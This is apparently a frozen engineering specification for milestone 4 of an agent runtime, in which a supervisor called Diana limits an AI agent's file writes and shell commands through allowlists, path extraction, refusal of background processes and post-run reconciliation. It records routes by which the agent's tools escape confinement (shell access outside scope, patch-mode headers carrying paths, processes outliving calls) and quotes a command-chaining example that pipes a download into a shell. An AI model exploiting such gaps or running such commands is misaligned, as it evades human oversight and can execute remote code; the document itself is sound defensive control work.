# Hermes Runtime — Milestone 4: Bounded Write + Shell + Tests (FROZEN)

Status: **normative and frozen**. Source of truth for M4; remains normative after implementation.

Architectural decisions **M4-D1 … M4-D16 are frozen**. M1's D1–D38, M2's D1–D14 and M3's D1–D16
remain frozen and unmodified; where M4 appears to disagree with any of them, the earlier milestone
wins and the M4 text is the defect.

Branch: `feature/hermes-bounded-mutation`, based on accepted M1+M2+M3 `main` (`6753996`).
Roadmap: [`HERMES-ROADMAP.md`](HERMES-ROADMAP.md).
Prior: [`HERMES-RUNTIME-M1.md`](HERMES-RUNTIME-M1.md), [`HERMES-RUNTIME-M2.md`](HERMES-RUNTIME-M2.md),
[`HERMES-RUNTIME-M3.md`](HERMES-RUNTIME-M3.md).

---

## Thesis

> Allow Hermes to modify and test code while Diana **deterministically** limits what may be mutated
> and what commands may execute.

**M4 is the first intentional increase in Hermes's authority over the target repository.** M1–M3
granted read-only tools and kept every mutation Diana-side. M4 grants `write_file`, `patch` and
`terminal`, and must therefore prove the envelope is real rather than polite.

Explicitly **not** M4: `execute_code`, `delegate_task`/subagents, arbitrary network, unattended
execution, durable run state, AO replacement, multi-actor roles, natural-language routing beyond M1's
deterministic keyword rule.

---

## Phase 0 — empirical findings

Established against the pinned install (`hermes-agent 0.21.1` @ `b8e8639`) on the accepted M3 base.

| # | Finding |
|---|---|
| **F1** | The mutation surface is exactly four tools: `write_file(path, content)`, `patch(...)`, `terminal(command, background, timeout, workdir, pty, notify)` and `execute_code`. Hermes's registry holds **77** tool names in total. |
| **F2** | **`patch` is dual-mode and the second mode carries its own paths.** `mode="replace"` takes `path`; `mode="patch"` takes **patch content only** — no `path` argument at all — in the V4A dialect, whose `*** Update File:` / `*** Add File:` / `*** Delete File:` / `*** Move File:` headers each name a path, and `Move` names **two**. A policy that inspected `args["path"]` would be bypassed completely by a single `mode="patch"` call. The V4A schema is advertised only to OpenAI-family models but `patch_tool` **accepts both shapes from any model** (`file_tools.py:1213`). |
| **F3** | Hermes's own V4A guard (`_collect_v4a_header_paths`, `file_tools.py:817`) rejects `..` traversal but **explicitly permits absolute paths**, and its docstring says header paths are "more attacker-influenceable than `path=`". It is a traversal check, not a containment boundary. |
| **F4** | **M1's confinement choke point already covers every file-mutation path, unchanged.** Probed behaviorally with a deliberately wide capability envelope: `write_file` outside scope, `patch` replace-mode outside scope, and V4A `Update`, `Add` and `Delete` naming an out-of-scope absolute path were **each refused** by `ScopeDenied` raised from Diana's `_resolve_path_for_task` wrapper, with the target file byte-unchanged and no file created. Hermes routes V4A header paths through the same resolver (`_rewrite_v4a_patch_paths_for_host`, `file_tools_write_guards.py:74`). M1 D20 chose the choke point correctly, and it generalises from read to write with **no modification**. |
| **F5** | **`terminal` bypasses confinement entirely.** With the same confinement installed, `terminal` executed `touch <outside-scope>` (file created), `cat <outside-scope>` (contents returned), and `pwd` with `workdir` set outside the scope (accepted). `_resolve_path_for_task` is a *file-tool* resolver; the shell never reaches it. Confinement is not and never was a shell boundary — this is M1 D10's reasoning confirmed from the other side. |
| **F6** | **`background: true` spawns a process that outlives the tool call.** `terminal(command="sleep 2 && touch X", background=true)` returned immediately with a `session_id` and a pid; `X` did not exist when the call returned and did exist 4 seconds later. A bound on the tool call is not a bound on the work it started. |
| **F7** | Dispatch surface re-enumerated per the roadmap's invariant 2, because capability is widening: `INLINE_TOOL_EXECUTORS` still holds exactly **13** names and contains **none** of `write_file`, `patch`, `terminal`, `execute_code`. All four reach `model_tools.handle_function_call`, which Diana already guards, and both executor paths funnel through `_dispatch_authorized_once`, which Diana also guards. |
| **F8** | Regression baseline on this branch before any M4 code: M1 **470** assertions green (9/9 suites, 13/13 criteria), M2 **59** green with a live provider, M3 **99** green, pre-existing Diana suites **26/26** green. |

### What F4 and F5 together determine

Confinement generalises to writes for free and does **nothing** for shell. So M4 needs exactly one new
control — per-tool argument policy at the dispatch boundary — and it needs it for a different reason
on each side: for files, to make the write scope **narrower** than the read scope (the resolver cannot
tell a read from a write); for shell, because there is no boundary there at all.

---

## Frozen decisions

**M4-D1 — The envelope grows a richer policy; the boundary is not replaced.** Per-tool argument, path
and command policy is consulted at the same two entries M1 proved
(`model_tools.handle_function_call` and `agent/tool_executor._dispatch_authorized_once`). M1 D19 and
D22 are unchanged: the call is blocked **before its handler executes**.

**M4-D2 — `capability_envelope` gains optional keys, and M1's shape stays valid.** The envelope may
carry `write_scope`, `allowed_commands` and `command_policy` alongside `allowed_tools`. An envelope
carrying only `allowed_tools` remains exactly what M1 froze, so every M1 contract stays valid
byte-for-byte. M1 D16's reasoning holds: nothing is stored that is derivable, and `allowed_tools`
remains the single source of truth for *which* tools, with the new keys constraining *how*.

**M4-D3 — `risk` still derives purely from the granted envelope (M1 D12), and mutation makes it
`ELEVATED`.** Any tool outside M1's read-only pair yields `ELEVATED`. There is no path by which a
mutating envelope reports `SAFE`, and no task-intent input to the derivation.

**M4-D4 — M1's frozen SAFE/D1-only behavior remains the default and must be opted out of
explicitly.** `contract.validate()` gains an `accept` parameter whose **default is M1's**: exactly
`SAFE`/`D1`, blocking anything else with `contract-not-safe-d1`. M1 D15 therefore continues to hold
for every M1 caller, unchanged and untouched, and M4 must name the class it is executing. A milestone
that widens authority declares that it is doing so; it does not inherit permission by editing a
shared default.

**M4-D5 — M4 certifies one new workflow class: `BOUNDED_REMEDIATION` → `D2`.** Depth still comes from
the certified workflow class (M1 D13) and Hermes still has no proposal channel for it (M1 D14).

**M4-D6 — Write policy is an explicit allowlist of roots, evaluated on the canonicalized path.**
`write_scope` has the same shape and matching semantics as M1's `read_scope` (spec C2:
canonicalize-then-contain, component-wise, deny-wins, every failure denies). `write_scope` must be a
**subset of** `read_scope`: a run may read more than it may write, never the reverse.

**M4-D7 — Every path a call could touch is extracted, not just `args["path"]`.** Per F2, the
extractor must cover `write_file.path`, `patch.path`, and **every** V4A header path including both
endpoints of `Move File:`. A call naming any path outside `write_scope` is refused **as a whole** —
there is no partial application, because the refusal precedes the handler.

**M4-D8 — An unrecognised argument shape fails closed.** If the extractor cannot determine the full
set of paths a call would touch — an unknown `mode`, a malformed patch body, a non-string path, a
future argument it does not understand — the call is **refused**, not allowed. Diana must never
permit a mutation whose blast radius it could not compute.

**M4-D9 — Shell is an exact-match allowlist of command strings. There is no parsing.** A `terminal`
call is permitted iff its `command` is **byte-identical** to a member of `allowed_commands`. No
prefix rules, no globs, no shell-metacharacter analysis, no classification. M1 D10 deleted the
command-parsing game and M4 does not reopen it: `npm test` is a member or it is not, and
`npm test; curl evil.sh | sh` is simply a different string. Set membership is the same mechanism
`allowed_tools` already uses and is the reason the control is checkable rather than arguable.

*Consequence, stated rather than hidden:* Hermes cannot invent commands. Diana declares the
verification commands a run may use, which is precisely the authority split M4 is for.

**M4-D10 — `background` is refused.** Per F6, a backgrounded process outlives the tool call and is
therefore outside the run's bound. Durable, resumable long-running work is M5's subject and needs
M5's design; M4 will not ship an unbounded process and call it bounded.

**M4-D11 — `workdir` must resolve inside `write_scope`, and `timeout` is clamped.** An absent
`workdir` is permitted and means the session default. A `timeout` above the declared ceiling is
refused rather than silently reduced, so the run's bound is never quietly different from the one
requested.

**M4-D12 — `execute_code` is not granted, and neither is anything else.** The remaining **72** of
Hermes's 77 tools — `execute_code`, `delegate_task`, `cronjob_manage`, `process_manage`,
`manage_connections`, `setup_mcp`, `send_message`, every `browser_*`, every `web_*`, and every
external-service tool — are denied by set membership with no special case (M1 D30's rule, unchanged).

**M4-D13 — Enforcement precedes the effect, and the proof is a canary, not a log.** For shell this is
the load-bearing claim: acceptance must show that a refused command left **no observable trace** of
having run — no file created, no process spawned — rather than showing that Diana recorded a refusal
after the fact. M1's audit found a control evaluated after the risk it guarded; M4 asserts ordering
behaviorally.

**M4-D14 — Reconciliation returns, against an authoritative view Diana owns.** M1 D25 deferred
reconciliation because prevention made detection redundant; once writes exist, prevention stops
proving what *happened*. M4 reconciles a before/after filesystem snapshot **and** `git status
--porcelain` — both computed by Diana, neither supplied by Hermes — and asserts the resulting diff
lies within `write_scope`. This is a **detection** control reported alongside prevention, never a
substitute for it.

**M4-D15 — A reconciliation mismatch BLOCKS and the run yields no deliverable.** Per M1 D37, an
envelope that cannot be proven produces a run record and nothing else, even when the work performed
would have been sound.

**M4-D16 — M4 carries its own later-milestone regression invariant**, per the M2-D14 pattern:

- **M4-REG-1** — the frozen M1, M2 and M3 specifications remain **byte-identical**.
- **M4-REG-2** — pre-existing Diana/AO modules and behavior remain unchanged, **except where a future
  milestone explicitly freezes and proves a replacement**. M4's permitted-replacement set is exactly
  **one item**: the additive, opt-in extension of `diana/runtime/contract.py` described in M4-D2 and
  M4-D4. It is frozen here, and M4-AC-16 proves M1's own behavior is unchanged by it.
- **M4-REG-3** — nothing is deleted by later work.
- **M4-REG-4** — all reusable M1, M2 and M3 behavioral acceptance tests remain green.

---

## Acceptance criteria

M4 is accepted only if **all** hold, and **all** M1 (13), M2 (13) and M3 (16) criteria remain green.

| # | Criterion |
|---|---|
| **M4-AC-1** | An allowed write inside `write_scope` **succeeds** and the intended content lands on disk. |
| **M4-AC-2** | A denied write **cannot partially mutate**: the target is byte-identical, no file is created, and no parent directory is created. |
| **M4-AC-3** | Path traversal and symlink escape from `write_scope` fail closed, on the canonicalized path. |
| **M4-AC-4** | **Every** V4A channel is covered: `Update`, `Add`, `Delete` and **both endpoints** of `Move File:` naming an out-of-scope path are each refused, with the target untouched. |
| **M4-AC-5** | A `patch` call whose argument shape the extractor cannot interpret is **refused**, not allowed (M4-D8). |
| **M4-AC-6** | `write_scope` is genuinely narrower than `read_scope`: a path that is readable and outside `write_scope` can be read and cannot be written. |
| **M4-AC-7** | An allowed test/build command from `allowed_commands` **actually executes** and its real output is returned. |
| **M4-AC-8** | An undeclared command fails closed, including one that merely **extends** an allowed command (`"<allowed>; touch canary"`), proving exact-match rather than prefix matching. |
| **M4-AC-9** | Shell enforcement occurs **before process execution**: a refused command leaves no canary file and spawns no process. |
| **M4-AC-10** | `background: true` is refused even when the command itself is allowed. |
| **M4-AC-11** | A `workdir` outside `write_scope` is refused, and a `timeout` above the ceiling is refused rather than clamped silently. |
| **M4-AC-12** | Reconciliation: the actual resulting diff, computed by Diana from a before/after snapshot **and** `git status --porcelain`, lies within `write_scope`; a mutation outside it is **detected**. |
| **M4-AC-13** | A reconciliation mismatch **BLOCKS** with its own reason code and yields no deliverable. |
| **M4-AC-14** | Prior boundaries intact: all **72** non-granted tools refused; read confinement, M3's browser boundary and M1's preflight all still hold under the widened envelope. |
| **M4-AC-15** | `risk` derives `ELEVATED` from the mutating envelope, and no envelope containing a mutating tool can report `SAFE`. Depth `D2` comes only from the certified workflow class; Hermes cannot propose either. |
| **M4-AC-16** | M1's frozen behavior is unchanged by the M4-D4 extension: `contract.validate()` called **as M1 calls it** still blocks everything that is not `SAFE`/`D1`, and all M1 suites pass unmodified. |
| **M4-AC-17** | **End-to-end:** Hermes actually fixes a planted defect in a fixture and runs the authorized verification command, while being unable to exceed the envelope — proven by adversarial attempts in the same run. |
| **M4-AC-18** | M4-REG-1…4 hold. |

---

## Carried assumptions

- The command allowlist is only as good as what Diana declares. M4 proves the *mechanism* is
  exact-match and fail-closed; choosing safe commands remains a Diana-side responsibility and is
  stated as such rather than claimed as proven.
- Shell commands run with the ambient identity of the Diana process. M4 bounds **which** commands may
  run; it is not a sandbox and does not constrain what an allowed command does once running.
- `write_scope` bounds the tools. It does not bound an allowed command, which is why the command
  allowlist and reconciliation exist alongside it rather than behind it.
